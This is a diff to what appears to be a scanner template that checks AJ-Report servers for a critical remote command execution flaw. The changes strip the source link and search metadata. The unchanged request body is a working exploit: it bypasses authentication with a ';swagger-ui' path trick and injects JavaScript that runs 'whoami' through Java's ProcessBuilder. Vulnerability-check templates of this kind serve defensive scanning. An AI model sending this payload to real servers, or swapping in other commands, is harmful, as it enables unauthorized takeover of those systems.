@@ -3,12 +3,8 @@ info:
   name: AJ-Report数据大屏系统 命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gbgb0otsdxszte1w'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gbgb0otsdxszte1w
-    fofa: ZoomEye:title:"AJ-Report"
 http:
 - raw:
   - 'POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
@@ -33,10 +29,6 @@ http:
 
 
     Connection: close
-
-
-
-
 
 
     {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='''';while((line = r.readLine()) != null){ss+=line};return ss;}"}
